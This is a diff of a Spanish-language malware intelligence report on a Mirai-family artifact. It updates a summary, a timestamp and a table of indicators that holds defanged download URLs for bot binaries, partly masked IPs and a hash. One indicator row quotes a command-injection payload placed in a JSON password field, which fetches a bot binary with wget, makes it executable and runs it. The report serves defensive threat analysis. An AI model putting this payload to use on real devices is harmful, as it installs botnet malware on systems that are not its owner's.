@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 12 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:10:14+00:00`
+- **Registrado:** `2026-08-09T20:10:14.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,18 +54,18 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 184.174.96.XXX | static_analysis |
-| ip | 190.179.172.XXX | static_analysis |
-| url | hxxp://184.174.96.XXX:8114/bot.armv4; | strings |
+| url | hxxp://184.174.96.XXX:8114/bot.x86_64; | strings |
 | url | hxxp://184.174.96.XXX:8114/bot.armv5l; | strings |
-| url | hxxp://184.174.96.XXX:8114/bot.armv6; | strings |
+| url | hxxp://184.174.96.XXX:8114/bot.mipsel; | strings |
+| url | hxxp://184.174.96.XXX:8114/bot.mips; | strings |
 | url | hxxp://184.174.96.XXX:8114/bot.armv7; | strings |
 | url | hxxp://184.174.96.XXX:8114/bot.i386; | strings |
-| url | hxxp://184.174.96.XXX:8114/bot.mips; | strings |
-| url | hxxp://184.174.96.XXX:8114/bot.mipsel; | strings |
-| url | hxxp://184.174.96.XXX:8114/bot.x86_64; | strings |
-| hash | 35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b | static_analysis |
+| url | hxxp://184.174.96.XXX:8114/bot.armv4; | strings |
+| url | hxxp://184.174.96.XXX:8114/bot.armv6; | strings |
+| ip | 184.174.96.XXX | static_analysis |
+| ip | 190.179.172.XXX | static_analysis |
 | command | {"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_ | strings |
+| hash | 35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b | static_analysis |
 | ip | 204.76.203.XXX | artifact_source |
 
 ## 🔎 Triage
